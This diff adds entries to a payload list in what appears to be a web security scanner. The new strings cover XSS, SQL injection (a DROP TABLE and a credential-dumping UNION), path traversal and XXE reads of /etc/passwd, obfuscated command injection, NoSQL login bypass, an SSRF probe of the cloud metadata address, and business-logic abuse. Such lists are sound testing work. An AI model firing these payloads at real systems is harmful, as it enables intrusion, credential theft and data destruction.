@@ -6,25 +6,64 @@ const PAYLOADS = {
         "<script>alert(1)</script>",
         "javascript:alert(1)",
         "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        "<iframe src=javascript:alert('XSS')>",
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
     ],
     sqli: [
         "' OR '1'='1",
         "UNION SELECT 1,2,3--",
         "admin' --",
+        "1' OR '1'='1",
+        "1 UNION SELECT NULL,username,password FROM users--",
+        "1' AND SLEEP(5)--",
+        "1;DROP TABLE users--",
+        "1' AND 1=CONVERT(int,@@version)--",
+        "'/**/OR/**/'1'='1",
+        "' oR '1'='1",
+        "admin'--",
     ],
     pathtraversal: [
         "../../etc/passwd",
         "..\\windows\\win.ini",
         "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "....//....//....//etc/passwd",
+        "../../etc/passwd%00.txt",
     ],
     cmdinjection: [
         "; cat /etc/passwd",
         "| whoami",
         "$(whoami)",
+        "; whoami",
+        "; ls -la",
+        "| id",
+        "`whoami`",
+        "$(cat /etc/passwd)",
+        "; sleep 5",
+        "& whoami",
+        "&& ls",
+        "|| cat /etc/passwd",
+        ";WhOaMi",
+        ";w''hoami",
+        ";${IFS}whoami",
     ],
     nosqli: [
         '{"$$gt": ""}',
-        '{"$$ne": null}'
+        '{"$$ne": null}',
+        '{"username":{"$$ne":null},"password":{"$$ne":null}}'
+    ],
+    business_logic: [
+        '{"codes":["SAVE10","SAVE20","SAVE30"]}',
+        '{"item_id":123,"quantity":-5}',
+        '{"amount":999999}',
+        '{"from":"victim","to":"attacker","points":999999}'
+    ],
+    api_abuse: [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>',
+        "http://169.254.169.254/latest/meta-data/",
+        '{"username":"test","password":"test","isAdmin":true}',
+        "query IntrospectionQuery { __schema { types { name } } }"
     ]
 };
 
